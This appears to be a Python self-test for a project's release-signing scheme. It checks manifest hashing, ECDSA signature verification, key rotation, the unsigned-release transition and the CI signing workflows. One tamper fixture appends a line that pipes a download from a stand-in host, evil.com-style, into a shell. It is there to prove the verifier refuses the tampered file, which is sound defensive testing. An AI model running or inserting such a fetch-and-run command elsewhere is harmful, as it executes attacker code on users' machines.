#!/usr/bin/env python3
"""Self-test for UPDATE-RESILIENCE Phase A — the release is signed, and a box checks it before installing.

Today the only transport is TLS to github.com, so what a signature buys is integrity against a corrupted
fetch and against raw's CDN — a party we do not control, and one that has already served this project stale
content. What it is FOR is Phase C: the moment a release may arrive from a mirror or another CDN, the
signature is the only thing between "another way in" and "another way to be owned". Adding mirrors first and
signing afterwards is the order that makes the product less safe, so signing comes first.

Choices this gate pins down, each measured rather than assumed:

  1. ⚠️ THE VERIFIER AND THE KEY LIVE IN bootstrap.sh, NOT IN THE TREE THEY VERIFY. bootstrap.sh arrives
     separately, over TLS; the tree is the payload. A check an attacker ships alongside their own payload
     checks nothing, so this asserts the verification is not in lib/ where the other shared helpers are.
  2. ⚠️ ECDSA P-256 OVER SHA-256, not Ed25519. Ed25519 is the better primitive and cannot be used here:
     `openssl dgst -sign` refuses an Ed25519 key outright, and `pkeyutl -rawin` — the form that works —
     arrived in OpenSSL 3.0, which would leave every Debian 11 / Ubuntu 20.04 box unable to verify and
     therefore, under a fail-closed rule, unable to update. This gate asserts the shipped form works with
     `dgst`, which is the property that made the choice.
  3. Tampering is caught — a changed file, a changed manifest, a signature from the wrong key.
  4. The manifest covers the WHOLE TRACKED TREE, including bootstrap.sh, update.sh and the install scripts.
     A manifest that covered only "shipped" files would sign the cargo and not the crane.
  5. ⚠️ AN UNSIGNED RELEASE IS STILL ALLOWED, on purpose and temporarily. A release published before Phase A
     carries no manifest, and a box updating from one must not be bricked by the absence of a file that did
     not exist when it was made. That is the transition, and this gate holds it to being deliberate —
     it also asserts the code carries the marker saying where the refusal goes.

Hermetic: no network. The two functions under test are extracted from the shipped bootstrap.sh and run in a
stub harness, so this exercises the real code rather than a copy of it that can drift.

Run: python3 tests/release_signature_selftest.py     (0 = pass)
     --perturb   drops the sha256sum -c step (signature checked, contents not) and expects RED on the
                 tampered-file case — the shape where a valid signature covers a modified tree.
"""
import os, re, shutil, subprocess, sys, tempfile

HERE = os.path.dirname(os.path.abspath(__file__))
ROOT = os.path.abspath(os.path.join(HERE, ".."))
BOOT = os.path.join(ROOT, "bootstrap.sh")
GEN = os.path.join(ROOT, "lib", "release-manifest.sh")
PERTURB = "--perturb" in sys.argv

FAILS = []
def check(name, cond, detail=""):
    print(("  PASS " if cond else "  FAIL ") + name + (("  — " + str(detail)) if detail and not cond else ""))
    if not cond:
        FAILS.append(name)

boot_src = open(BOOT, encoding="utf-8").read()

# ── [1] the verifier is in the anchor, not in the payload ────────────────────────────────────────────────
check("[1] ⚠️ verification lives in bootstrap.sh", "verify_fetched_tree()" in boot_src)
common = open(os.path.join(ROOT, "lib", "common.sh"), encoding="utf-8").read()
check("[1b] ⚠️ …and NOT in the tree it verifies", "openssl dgst -sha256 -verify" not in common)
check("[1c] the transition is marked where the refusal goes", "MAKE THIS A `die`" in boot_src)

# ── extract the real functions and run them in a stub harness ────────────────────────────────────────────
def _fn(name):
    m = re.search(r"^%s\(\)\{.*?^\}" % re.escape(name), boot_src, re.S | re.M)
    assert m, "could not extract %s() from bootstrap.sh — the gate is measuring nothing" % name
    return m.group(0)

VERIFY = _fn("verify_fetched_tree")
KEYS = _fn("emit_release_keys")
# The key directory is a top-level assignment in bootstrap.sh, not part of either function. Lift it from
# the source as well — restating it here would be a second copy free to drift from the one that ships.
_kd = re.search(r'^RELEASE_KEYS_D=.*$', boot_src, re.M)
assert _kd, "RELEASE_KEYS_D assignment not found in bootstrap.sh"
KEYDIR_ASSIGN = _kd.group(0)
if PERTURB:
    anchor = 'sha256sum -c --quiet "$man"'
    assert VERIFY.count(anchor) == 1, "perturbation anchor drifted (%d hits) — fix the gate" % VERIFY.count(anchor)
    VERIFY = VERIFY.replace(anchor, 'true', 1)

HARNESS = """
die(){  echo "DIE: $*" >&2; exit 1; }
warn(){ echo "WARN: $*" >&2; }
info(){ echo "INFO: $*"; }
need(){ command -v "$1" >/dev/null 2>&1; }
REF=testref
TMP="$PWD/.tmp"; mkdir -p "$TMP"
%s
%s
%s
verify_fetched_tree
""" % (KEYDIR_ASSIGN, KEYS, VERIFY)

TMP = tempfile.mkdtemp(prefix="swg-relsig-")
KEYDIR = os.path.join(TMP, "keys")
os.makedirs(KEYDIR)
run = lambda *a, **k: subprocess.run(*a, capture_output=True, text=True, **k)

# a throwaway release key — the production one is generated and custodied outside this repo
run(["openssl", "ecparam", "-name", "prime256v1", "-genkey", "-noout",
     "-out", os.path.join(KEYDIR, "k.key")])
run(["openssl", "ec", "-in", os.path.join(KEYDIR, "k.key"), "-pubout",
     "-out", os.path.join(KEYDIR, "k.pub")])
# …and a DIFFERENT key, to prove a valid signature from the wrong signer is refused
run(["openssl", "ecparam", "-name", "prime256v1", "-genkey", "-noout",
     "-out", os.path.join(KEYDIR, "evil.key")])


def make_tree(sign_with="k.key", publish_keys=("k.pub",)):
    """A miniature fetched tree: a few files, a manifest, a signature, and the keys bootstrap would embed."""
    d = tempfile.mkdtemp(prefix="swg-tree-", dir=TMP)
    for name, body in (("swg-noded", "#!/usr/bin/env python3\nprint('node')\n"),
                       ("VERSION", "9.9.9-beta\n"),
                       ("update.sh", "#!/usr/bin/env bash\necho updating\n")):
        open(os.path.join(d, name), "w").write(body)
    lines = []
    for name in sorted(os.listdir(d)):
        h = run(["sha256sum", name], cwd=d).stdout
        lines.append(h)
    open(os.path.join(d, "MANIFEST.sha256"), "w").write("".join(lines))
    if sign_with:
        run(["openssl", "dgst", "-sha256", "-sign", os.path.join(KEYDIR, sign_with),
             "-out", os.path.join(d, "MANIFEST.sha256.sig"), os.path.join(d, "MANIFEST.sha256")])
    kd = os.path.join(d, ".tmp", ".swg-release-keys")
    os.makedirs(kd, exist_ok=True)
    for k in publish_keys:
        shutil.copy(os.path.join(KEYDIR, k), os.path.join(kd, k))
    return d


def verify(d, env=None):
    e = dict(os.environ)
    e.update(env or {})
    r = run(["bash", "-c", HARNESS], cwd=d, env=e)
    return r.returncode, (r.stdout + r.stderr)


# ── [2] a good tree verifies ─────────────────────────────────────────────────────────────────────────────
rc, out = verify(make_tree())
check("[2] a correctly signed tree is accepted", rc == 0, out.strip())
check("[2b] …and it says what it checked", "release verified" in out, out.strip())

# ── [3] a tampered FILE is caught, even though the signature is genuine ──────────────────────────────────
d = make_tree()
open(os.path.join(d, "swg-noded"), "a").write("\nos.system('curl evil.example|sh')\n")
rc, out = verify(d)
check("[3] ⚠️ a modified file is refused", rc != 0, out.strip())
check("[3b] …and the refusal names the cause", "does not match what was signed" in out, out.strip())

# ── [4] a tampered MANIFEST is caught by the signature ───────────────────────────────────────────────────
d = make_tree()
man = os.path.join(d, "MANIFEST.sha256")
open(man, "w").write(open(man).read().replace("swg-noded", "swg-noded"). \
                     replace(open(man).read()[:8], "deadbeef"))
rc, out = verify(d)
check("[4] a rewritten manifest is refused", rc != 0, out.strip())
check("[4b] …by the signature, not by the hashes", "does not match any release key" in out, out.strip())

# ── [5] a valid signature from the WRONG key is refused ──────────────────────────────────────────────────
rc, out = verify(make_tree(sign_with="evil.key", publish_keys=("k.pub",)))
check("[5] ⚠️ a signature from an untrusted key is refused", rc != 0, out.strip())
check("[5b] …and says so", "does not match any release key" in out, out.strip())

# ── [6] two keys are accepted, so rotation has an overlap window ─────────────────────────────────────────
run(["openssl", "ec", "-in", os.path.join(KEYDIR, "evil.key"), "-pubout",
     "-out", os.path.join(KEYDIR, "next.pub")])
rc, out = verify(make_tree(sign_with="evil.key", publish_keys=("k.pub", "next.pub")))
check("[6] a release signed by the NEXT key verifies while both are published", rc == 0, out.strip())

# ── [7] the transition: no manifest → allowed, and announced ─────────────────────────────────────────────
d = make_tree()
os.remove(os.path.join(d, "MANIFEST.sha256"))
os.remove(os.path.join(d, "MANIFEST.sha256.sig"))
rc, out = verify(d)
check("[7] an unsigned (pre-Phase-A) release is still installable", rc == 0, out.strip())
check("[7b] …and says it was not verified", "no signature" in out, out.strip())

# ── [8] the escape hatch works and is loud ───────────────────────────────────────────────────────────────
d = make_tree()
open(os.path.join(d, "swg-noded"), "a").write("\ntampered\n")
rc, out = verify(d, env={"SWG_SKIP_VERIFY": "1"})
check("[8] SWG_SKIP_VERIFY=1 installs anyway", rc == 0, out.strip())
check("[8b] …and warns that it did", "WITHOUT verifying" in out, out.strip())

# ── [9] the real generator covers the whole tracked tree, crane included ─────────────────────────────────
r = run(["git", "ls-files"], cwd=ROOT)
tracked = {l for l in r.stdout.split() if l}
# ⚠️ THE MANIFEST IS A SIGNED RELEASE ARTIFACT — DO NOT DAMAGE IT. The generator writes to a fixed path in
# the repo root, and the first version of this only cleaned up when no manifest had existed beforehand. The
# day a real release was signed, running the gate silently REGENERATED the signed manifest and the operator's
# signature stopped matching — a test that broke the thing it was testing, and reported a clean pass while
# doing it. Save the bytes first and put them back unconditionally, then assert the restore actually worked:
# a restore that quietly failed would leave exactly the damage this is here to prevent.
_man_path = os.path.join(ROOT, "MANIFEST.sha256")
_man_before = open(_man_path, "rb").read() if os.path.exists(_man_path) else None
gen = run(["bash", GEN, "generate"], cwd=ROOT)
listed = {l.split("  ", 1)[1].rstrip("\n") for l in open(os.path.join(ROOT, "MANIFEST.sha256")) if "  " in l}
missing = tracked - listed - {"MANIFEST.sha256", "MANIFEST.sha256.sig"}
check("[9] every tracked file is in the manifest", not missing, sorted(missing)[:5])
for crane in ("bootstrap.sh", "update.sh", "install-host.sh", "install-node.sh", "lib/common.sh"):
    check("[9b] the manifest covers %s" % crane, crane in listed)
if _man_before is None:
    os.remove(_man_path)
else:
    open(_man_path, "wb").write(_man_before)
    check("[9c] ⚠️ the gate restored the signed manifest it had to overwrite",
          open(_man_path, "rb").read() == _man_before)

# ── [10] the primitive works with the openssl form every supported box has ───────────────────────────────
r = run(["openssl", "dgst", "-sha256", "-verify", os.path.join(KEYDIR, "k.pub"),
         "-signature", "/dev/null", os.path.join(ROOT, "VERSION")])
check("[10] ⚠️ `dgst -sha256` is the verify form (works from openssl 1.0.2)",
      "Key type not supported" not in (r.stdout + r.stderr), (r.stdout + r.stderr).strip())

# ── [11] the signing workflow cannot quietly do the wrong thing ──────────────────────────────────────────
# CI signs (the custody decision), which means CI COMMITS to a branch. That collides with a standing rule:
# main carries one squashed commit per release whose parent is the previous release commit. The resolution
# is that signing is manual and targets `dev`, and the release squash carries the manifest to main — so
# main gains the signature without gaining a commit. These checks keep that from eroding.
WF = os.path.join(ROOT, ".github", "workflows", "sign-release.yml")
check("[11] there is a signing workflow", os.path.exists(WF))
wf = open(WF, encoding="utf-8").read() if os.path.exists(WF) else ""
check("[11b] ⚠️ it is manual — never on push, which would put a bot commit on every release",
      "workflow_dispatch" in wf and re.search(r"^on:\s*\n\s+push:", wf, re.M) is None)
check("[11c] it defaults to dev, not main", re.search(r"default:\s*'dev'", wf) is not None)
check("[11d] ⚠️ it refuses when the signing secret is absent", "RELEASE_SIGNING_KEY is not set" in wf)
# The old guard ("bootstrap.sh carries no public key") is gone because it cannot happen any more: CI
# derives the public half from the secret, so a tree being signed always gets one. The refusal moved to
# the secret itself, where the real mistakes now live — a secret that is not an EC key (a bad paste), or
# no usable secret at all. Both must be errors rather than an unsigned release that looks signed.
check("[11e] ⚠️ it refuses a secret that is not a readable EC private key",
      "is not a readable EC private key" in wf)
check("[11e2] ⚠️ …and refuses when no secret is usable at all",
      "no usable signing key in the repository secrets" in wf)
check("[11f] ⚠️ it verifies against the EMBEDDED public key, not the private one it just used",
      "verifies against NO key embedded" in wf)
check("[11g] its commit skips the image rebuild it cannot affect", "[skip ci]" in wf)

# ── [11h] the operator's job is the secret, not a file edit ──────────────────────────────────────────────
# The public half is DERIVED from the secret and written in by machine. A key transcribed by hand is one
# that can be transcribed wrongly, and that mistake makes every install refuse every release — including
# the one that would fix it. So the workflow must derive, and the embedder must be the thing that writes.
check("[11h] ⚠️ CI derives the public half rather than asking for it", "openssl ec -in" in wf and "-pubout" in wf)
check("[11i] …using the embedder, not inline yaml-in-shell-in-python",
      "embed-release-keys.py" in wf)
check("[11j] …and commits bootstrap.sh, since embedding changes it", "MANIFEST.sha256.sig bootstrap.sh" in wf)

# ── [11k] the embedder actually embeds, is idempotent, and cannot silently write nothing ─────────────────
EMB = os.path.join(ROOT, ".github", "embed-release-keys.py")
check("[11k] the embedder exists", os.path.exists(EMB))
_ed = os.path.join(TMP, "embed")
os.makedirs(_ed, exist_ok=True)
for i, kn in enumerate(("k.key", "evil.key"), 1):
    run(["bash", "-c", "openssl ec -in %s -pubout > %s/pub-%d.pem 2>/dev/null"
         % (os.path.join(KEYDIR, kn), _ed, i)])
_boot_copy = os.path.join(TMP, "bootstrap.sh")
shutil.copy(BOOT, _boot_copy)
r1 = run([sys.executable, EMB, _ed, _boot_copy])
check("[11l] it embeds both keys", "embedded 2" in r1.stdout, (r1.stdout + r1.stderr).strip())
_after = open(_boot_copy, encoding="utf-8").read()
check("[11m] …into emit_release_keys(), leaving valid shell",
      run(["bash", "-n", _boot_copy]).returncode == 0)
check("[11n] …flush-left, or openssl will not parse the PEM",
      "\n-----BEGIN PUBLIC KEY-----" in _after)
check("[11o] …with a quoted heredoc, so the shell cannot expand the key",
      "<<'PUBKEY'" in _after)
r2 = run([sys.executable, EMB, _ed, _boot_copy])
check("[11p] ⚠️ it is idempotent — a re-run commits nothing", "already current" in r2.stdout,
      (r2.stdout + r2.stderr).strip())
_drift = os.path.join(TMP, "drifted.sh")
open(_drift, "w").write("emit_release_keys(){\n  # renamed away\n}\n")
r3 = run([sys.executable, EMB, _ed, _drift])
check("[11q] ⚠️ it FAILS on drift rather than writing nothing quietly",
      r3.returncode != 0 and "drifted" in (r3.stdout + r3.stderr), (r3.stdout + r3.stderr).strip())

# ── [13] the main-side backstop for the manual signing step ──────────────────────────────────────────────
# Signing is manual, because main carries one squashed commit per release and a bot commit per push is not
# available to us. A manual step can be forgotten; this is what makes forgetting loud instead of silent.
VWF = os.path.join(ROOT, ".github", "workflows", "verify-release.yml")
VSH = os.path.join(ROOT, ".github", "verify-release.sh")
check("[13] there is a main-side verify workflow", os.path.exists(VWF) and os.path.exists(VSH))
vwf = open(VWF, encoding="utf-8").read() if os.path.exists(VWF) else ""
check("[13b] it runs on pushes to main", re.search(r"push:\s*\n\s+branches:\s*\[main\]", vwf) is not None)
vsh = open(VSH, encoding="utf-8").read() if os.path.exists(VSH) else ""
check("[13c] ⚠️ it runs the SHIPPED verifier, not a second copy that can drift",
      "verify_fetched_tree" in vsh and "openssl dgst" not in vsh)
check("[13d] ⚠️ SWG_SKIP_VERIFY cannot wave a release through", "env -u SWG_SKIP_VERIFY" in vsh)
check("[13e] a failed extraction is fatal, not an empty pass", "it has drifted" in vsh)

# Behaviour, not just shape: four states, run for real against throwaway trees.
def _vtree(sign_with="k.key", embed=True, stale=False, drop_manifest=False):
    d = tempfile.mkdtemp(prefix="swg-vr-", dir=TMP)
    os.makedirs(os.path.join(d, ".github"), exist_ok=True)
    os.makedirs(os.path.join(d, "lib"), exist_ok=True)
    shutil.copy(VSH, os.path.join(d, ".github", "verify-release.sh"))
    shutil.copy(os.path.join(ROOT, "lib", "release-manifest.sh"), os.path.join(d, "lib"))
    # ⚠️ SET THE KEY STATE, DO NOT ASSUME IT. The first version of this appended a key by replacing the
    # empty slot's `return 0`, which silently stopped matching the day a real release was signed and the
    # shipped bootstrap.sh gained a key of its own. Both fixtures then tested something other than what
    # they claimed: the "no key" tree had one, and the "properly signed" tree carried the PRODUCTION key
    # while being signed with a throwaway. Rewrite the whole function body instead, so the fixture's key
    # state is what the fixture says it is regardless of what the repo currently ships.
    boot = open(BOOT, encoding="utf-8").read()
    _m = re.search(r'(emit_release_keys\(\)\{\n  mkdir -p "\$RELEASE_KEYS_D"\n)(.*?)(\n\}\n)', boot, re.S)
    assert _m, "emit_release_keys() shape changed — this fixture can no longer control the key state"
    body = "  return 0\n"
    if embed:
        pub = open(os.path.join(KEYDIR, "k.pub"), encoding="utf-8").read().strip()
        body = '  cat > "$RELEASE_KEYS_D/release-1.pub" <<\'PUBKEY\'\n%s\nPUBKEY\n' % pub
    boot = boot[:_m.end(1)] + body + _m.group(3) + boot[_m.end(3):]
    open(os.path.join(d, "bootstrap.sh"), "w", encoding="utf-8").write(boot)
    open(os.path.join(d, "VERSION"), "w").write("9.9.9-beta\n")
    run(["git", "init", "-q", "."], cwd=d); run(["git", "add", "-A"], cwd=d)
    if not drop_manifest:
        run(["bash", "lib/release-manifest.sh", "generate"], cwd=d)
        run(["bash", "lib/release-manifest.sh", "sign", os.path.join(KEYDIR, sign_with)], cwd=d)
    if stale:
        open(os.path.join(d, "VERSION"), "a").write("# later change\n")
    return run(["bash", ".github/verify-release.sh"], cwd=d)

r = _vtree(embed=False, drop_manifest=True)
check("[13f] no key embedded yet → passes, signing is not live", r.returncode == 0, r.stderr.strip()[:120])
r = _vtree(drop_manifest=True)
check("[13g] ⚠️ key embedded but nobody signed → FAILS", r.returncode != 0)
check("[13h] …and names the fix", "sign-release workflow" in (r.stdout + r.stderr))
r = _vtree()
check("[13i] properly signed → passes", r.returncode == 0, (r.stdout + r.stderr).strip()[:160])
r = _vtree(stale=True)
check("[13j] ⚠️ STALE manifest (signed, then a commit landed) → FAILS", r.returncode != 0)
check("[13k] …and says it is staleness, not a hostile mirror",
      "STALE" in (r.stdout + r.stderr), (r.stdout + r.stderr).strip()[:160])

# ── [12] if a production key has been embedded, the workflow can actually extract it ─────────────────────
# Conditional by design: the slot is empty until a key exists, and this gate must not fail for that. What
# it must not allow is a key that is embedded in a shape the extractor cannot read — that would sign
# releases nobody can verify, which is the failure the workflow's own guard is aiming at.
if "BEGIN PUBLIC KEY" in boot_src:
    ext = os.path.join(TMP, "extracted.pub")
    run(["bash", "-c", "awk -v d=%s '/BEGIN PUBLIC KEY/{n++} n{print > (d \"/relkey-\" n \".pub\")}' %s"
         % (TMP, BOOT)])
    keys = [f for f in os.listdir(TMP) if f.startswith("relkey-")]
    check("[12] the embedded key(s) extract", bool(keys), "none extracted")
    for k in keys:
        r = run(["openssl", "pkey", "-pubin", "-in", os.path.join(TMP, k), "-noout"])
        check("[12b] %s is a parseable public key" % k, r.returncode == 0, r.stderr.strip())
else:
    print("  SKIP [12] no production key embedded yet — slot is empty (see emit_release_keys)")

shutil.rmtree(TMP, ignore_errors=True)
print()
if FAILS:
    print("FAILED (%d): %s" % (len(FAILS), ", ".join(FAILS)))
    sys.exit(1)
print("all checks passed")
